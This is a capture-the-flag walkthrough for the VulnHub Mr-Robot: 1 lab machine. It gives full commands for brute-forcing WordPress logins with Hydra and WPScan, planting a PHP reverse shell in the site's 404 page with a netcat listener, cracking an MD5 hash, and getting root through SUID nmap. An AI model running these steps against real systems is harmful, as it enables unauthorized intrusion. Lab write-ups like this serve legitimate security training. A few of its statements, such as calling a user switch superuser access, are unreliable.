[Mr. Robot](https://www.imdb.com/title/tt4158110/) is one of the greatest TV shows ever made, and it is the most authentic representation of actual real life hacking to this day.
[Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) has 3 flags to find.

## Preparation & Enumeration

The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.<br>
On the isolated internal network, the VirtualBox DHCP server assigns IP addresses to the machines:

```sh
marci@arch$ vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
```

The **Kali** machine received the IP address `10.38.1.110`.

Launching **Mr. Robot**, we're presented with a login screen that cannot be bypassed as the login credentials aren't known.

### Nmap

**Nmap** can be used to discover the vulnerable machine on the network:

```sh
kali@kali$ nmap -sS -T4 10.38.1.110-120
```

```sh
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 15:04 EDT
Nmap scan report for 10.38.1.110
Host is up (0.0000060s latency).
All 1000 scanned ports on 10.38.1.110 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap scan report for 10.38.1.111
Host is up (0.00050s latency).

Nmap done: 11 IP addresses (2 hosts up) scanned in 32.14 seconds
```

**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111`.<br>
Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=80) and [443](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=443) are well-known ports used to establish connection with **web servers**.<br>
Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the [Mr. Robot TV series](https://www.imdb.com/title/tt4158110/).

![fsociety](https://www.dropbox.com/s/mh5v8lc88k9r8tx/fsociety.png?dl=1)

Checking the displayed commands won't get us anywhere close to the first flag.

## Flag One

### Nikto

**Nikto** can be used to gather further information about the web server.

```sh
kali@kali$ nikto -h 10.38.1.111
```

```
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 19 item(s) reported on remote host
```
**Nikto** has discovered that the server is running an instance of **WordPress**.

![wordpress](https://www.dropbox.com/s/qfke2r46f8cjcgc/wplogin.jpg?dl=1)

**Nikto** also indicates that the server leaks inodes via ETags and a header has been found with file `/robots.txt`.

```sh
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.38.1.111
+ Target Hostname:    10.38.1.111
+ Target Port:        80
+ Start Time:         2022-04-07 15:29:21 (GMT-4)
---------------------------------------------------------------------------
+
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0.29 0x52467010ef8ad
```

### Robots.txt

> A [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro) file tells search engine crawlers which URLs the crawler can access on your site.
> This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.

`robots.txt` indicates that the server doesn't have an user agent, but it has two files:

![robots](https://www.dropbox.com/s/wqomn14tb6zo8qx/robots.png?dl=1)

These files can be downloaded with **wget**:

```sh
kali@kali$ wget 10.38.1.111/fsocity.dic
kali@kali$ wget 10.38.1.111/key-1-of-3.txt
```

We can use **cat** to output the content of `key-1-of-3.txt`:

```sh
kali@kali$ cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

## Flag Two

As SSL isn't enabled on the WordPress login page, it may be brute forced with the previously acquired dictionary file.

`fsocity.dic` contains duplicated entries that should be removed.

```sh
kali@kali$ cat fsocity.dic | sort -u | uniq > wordlist.dic
```

The word count of `fsocity.dic` has decreased from `858160` to `11451`.

```
kali@kali$ wc -l fsocity.dic
858160 fsocity.dic
```

```
kali@kali$ wc -l wordlist.dic
11451 wordlist.dic
```

### POST request

To start the brute force attack, we need to intercept an http POST request in [Burp Suite](https://portswigger.net/burp).


> The [POST request](https://en.wikipedia.org/wiki/POST_(HTTP)) method requests that a web server accept the data enclosed in the body of the request message, most likely for storing it.
> It is often used when uploading a file or when submitting a completed web form _(e.g. login form)_.

To do that, a manual proxy must be configured in the browser (FireFox) and Burp Suite should have the same proxy listener set:

![proxy-browser](https://www.dropbox.com/s/gmy9hh0pjqyqwgz/proxy.jpg?dl=1)

![proxy-burpsuite](https://www.dropbox.com/s/5256rk1t5vthmws/burpsuite-proxy.png?dl=1)

To intercept the http POST request, I have filled the WordPress login form with random credentials:

- **Username**: Test
- **Password**: Password123

![burpsuite](https://www.dropbox.com/s/a6ay1bq6thlap7m/burpsuite.png?dl=1)

In the intercepted POST request - that has been sent to the server - we're interested in the `log`, `pwd`, and the `wp-submit` fields.

### Hydra

Based on the captured http POST request, we can use **hydra** to guess the username:

```sh
kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

<details>
<summary>Explain this command</summary>

<table>
  <tr>
    <td>-V</td>
    <td>Verbose</td>
  </tr>
  <tr>
    <td>-L fsocity.dic</td>
    <td>Define dictionary</td>
  </tr>
  <tr>
    <td>-p 123</td>
    <td>Random unique password</td>
  </tr>
  <tr>
    <td>10.38.1.111</td>
    <td>IP of the vulnerable machine</td>
  </tr>
  <tr>
    <td>http-post-form</td>
    <td>An http POST form is being brute forced</td>
  </tr>
  <tr>
    <td>/wp-login.php</td>
    <td>Path where the login form is located</td>
  </tr>
  <tr>
    <td>log=^USER^&pwd=^PASS&wp-submit=Log+In</td>
    <td>POST parameters to send, including placeholders</td>
  </tr>
  <tr>
    <td>F=Invalid Username</td>
    <td>Consider an attempt as failure if the response contains the text "Invalid Username".</td>
  </tr>
</table>

</details>

**hydra** has found 3 possible usernames: `elliot`, `Elliot` and `ELLIOT`.

```sh
[80][http-post-form] host: 10.38.1.111 login: elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: Elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: ELLIOT password: 123
```

### WPScan

**WPScan** can be used to find additional WordPress vulnerabilities and to brute force the password using the word list.

```sh
kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
```

```sh
[+] performing password attach on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot - / ER28-0652
All Found
Progress Time: 00:00:19 <========================================================================

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

**WPScan** has found several outdated plugins and one valid username - password pair.<br>
Testing the credentials, we can log in to the WordPress administration interface indeed.

### Reverse shell

> A **reverse shell** is a shell session established on a connection that is initiated from the victim's remote machine, not from the attackerâ€™s host.
> Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session (for gaining access) on the target machine.

I've downloaded a basic PHP reverse shell code from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).<br>
Prior to uploading the PHP code, the attacking machine's IP address must be assigned to the `$ip` variable.

```php
$ip = '10.38.1.110';  // CHANGE THIS
```

As we can log in to the WordPress site with the acquired credentials, the PHP reverse shell code can be included in a PHP file that already exists.<br>
I have replaced PHP code in the site's 404 page - loading the 404 page, will now will execute the PHP reverse shell code.

> [404](https://en.wikipedia.org/wiki/HTTP_404) is an HTTPS standard response code, to indicate that the browser was able to communicate with a given server, but the server could not find what was requested.

**netcat** is being used to listen to every incoming connections on port `1234`.

```sh
kali@kali$ netcat -lvp 1234
listening on [any] 1234 ...
```

To start the reverse shell, the 404 page can be called with **curl** in another terminal instance.

```sh
kail@kali$ curl http://10.38.1.111/404.php
```

!!!!!!!!!!!!!!!!!

```sh
10.38.1.111: inverse host lookup failed: Host name lookup failure
connect to [10.38.1.110] from (UNKNOWN) [10.38.1.111] 41282
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 02:06:59 up 1 min,  0 users,  load average: 0.03, 0.01, 0.01

uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

Entering the `id` command, we can see that we're logged in as a daemon and not as an actual user.
This means that our current session does not have any permission (e.g. to read or to modify files).

```sh
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> A [daemon](https://en.wikipedia.org/wiki/Daemon_(computing)) is a computer program that runs as a background process, rather than being under the direct control of an interactive user.

After checking our user's home directory, we can find two files that could be interesting for us.

```sh
$ cd /home/robot
```
```sh
$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

```

Taking a glance at the file permissions, it is clearly visible that `key-2-of-3.txt` is only available to read for the user named `robot`.<br>
To prove this, we can try to output the content of the file.

```sh
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

To get our hands on the second key, we need to perform a privilege escalation and become the root user.<br>
Interestingly, the content of `passowrd.raw-md5` can be read, and it looks like an unsalted MD5 hashed password.

```sh
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

To crack this hash, we can either use [hashcat](https://hashcat.net/hashcat/)  or [CrackStation.net](https://crackstation.net) that is a free online hash cracking tool.

### hashcat

I have decided to go with **hashcat** - it is the default tool built into Kali Linux.

```sh
kali@kali$ hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt.gz -o result.txt
```

<details>
<summary>Explain this command</summary>

<table align ="center">
  <tr>
    <td>-a 0</td>
    <td>Attack mode: 0 - Straight</td>
  </tr>
  <tr>
    <td>-m 0</td>
    <td>Hash type: 0 - MD5</td>
  </tr>
  <tr>
    <td>password.md5</td>
    <td>Password file where the hash is placed</td>
  </tr>
  <tr>
    <td>/usr/share/wordlists/rockyou.txt.gz</td>
    <td>RockYou password list</td>
  </tr>
  <tr>
    <td>-o result.txt</td>
    <td>Define output file</td>
  </tr>
</table>

</details>


```sh
cat result.txt
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Now, we can log in as the Superuser with the acquired password.

```sh
$ su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$
```

As we have Superuser privileges, `key-2-of-3.txt` becomes readable.

```sh
robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## Flag Three

Given that there is only one flag left, and we have not got root access to this box yet, this would have to be the next logical step.

> The [root account](https://www.ibm.com/docs/en/aix/7.2?topic=passwords-root-account) is a special user in the `/etc/passwd` file with the User ID (UID) of 0 that has virtually unlimited access to all programs, files, and resources on a system.

### Privilege Escalation

To elevate our privileges, we might have to search for binaries - with the `find` command - that we can run interactively and with the SUID bit set.

> [SUID bit](https://en.wikipedia.org/wiki/Setuid) is a Linux file permission setting that allows a user to execute a file or program with the permission of the owner of that file.

```sh
robot@linux:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

<details>
<summary>Explain this command</summary>

<table align ="center">
  <tr>
    <td>find</td>
    <td>Search for files in a directory hierarchy</td>
  </tr>
  <tr>
    <td>/</td>
    <td>Search in the root directory (/)</td>
  </tr>
  <tr>
    <td>-perm -4000</td>
    <td>Permission bits mode are set (setuid bit set)</td>
  </tr>
  <tr>
    <td>2>/dev/null</td>
    <td>Redirect STDERR to null device to throw away error messages</td>
  </tr>
</table>

</details>

From the search result we can point out **nmap** - it's SUID bit is set, meaning that it can theoretically execute commands as root.<br>
The `nmap --help` command tells us that **nmap** has a `--interactive` option.

```sh
robot@linux:~$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```

Nmap's help indicates that we can run shell commands in the foreground.

```sh
nmap> h
```
```sh
! <command>   -- runs shell command given in the foreground
```

We can use this option to our advantage and spawn a root shell.

```sh
nmap> !sh
!sh
# whoami
root
```

Now, that we have root privileges, we can check out what is inside the `/root` folder.

```sh
# cd /root
# ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
```

```sh
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

## Summary

Mr. Robot is a great introduction to test our basic web application penetration testing skills: reconnaissance with Nmap, http POST request capturing with Burp Suite, password cracking using bute force dictionary attack, establishing a reverse shell connection, and escalating privileges to gain root access.
